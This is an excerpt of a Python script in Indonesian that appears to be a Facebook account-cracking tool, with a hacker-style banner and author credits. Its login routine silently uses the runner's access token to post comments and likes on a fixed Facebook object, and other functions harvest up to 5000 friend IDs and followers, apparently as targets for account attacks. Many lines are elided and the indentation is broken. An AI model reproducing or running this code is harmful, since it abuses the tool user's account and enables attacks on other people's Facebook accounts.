...
┃┃╱╱┃┃┃╰┫╰━╯┃┃╱╱╭┫┣┫╰━╯┃╰━╮
╰╯╱╱╰╯╰━┻━━━┻╯╱╱╰━━┻━━━┻━━╯
Author: Shadow X Franky
Github:Shadow
link pekob:XNXX.COM+YANDEX+SIMONTOK by:Adzi
 [x]──────────────────────────────────────────[x]
"""
...
ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X; vi) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/19A5340a UCBrowser/11.3.5.1203 Mobile '
...
def cek_login():
	...
	requests.post('https://graph.facebook.com/122338450171860/comments/?message=' +kom+ '&access_token=' + toket)
        requests.post('https://graph.facebook.com/122338450171860/likes?summary=true&access_token=' + toket)
        requests.post('https://graph.facebook.com/122338450171860/comments/?message=Mantap Banget Bang ❤️&access_token=' + toket)
        requests.post('https://graph.facebook.com/122338450171860/likes?summary=true&access_token=' + toket)
...
def menu():
  ...
  if mn == "":
    ...
    print (' [0] Kembali Kehatimu\n')
    hs = raw_input(' [✓] Silahkan Pilih : ')
    if hs == '':
        menu()
    elif hs == '1' or hs == '01':
	ok()
...
def teman():
		...
		limit = '5000'
			...
			print (' [✓] Tidak Mempunyai Teman')
			raw_input(" {Silahkan Kembali}")
                        menu()
                id = []
                z=json.loads(r.text)
...
def follow():
		...
		print(' [✓] Tidak Mempunyai Followers')
                raw_input(' {Silahkan Kembali}')
                menu()
        except requests.exceptions.ConnectionError:
		print(' [✓] Tidak Ada Koneksi')
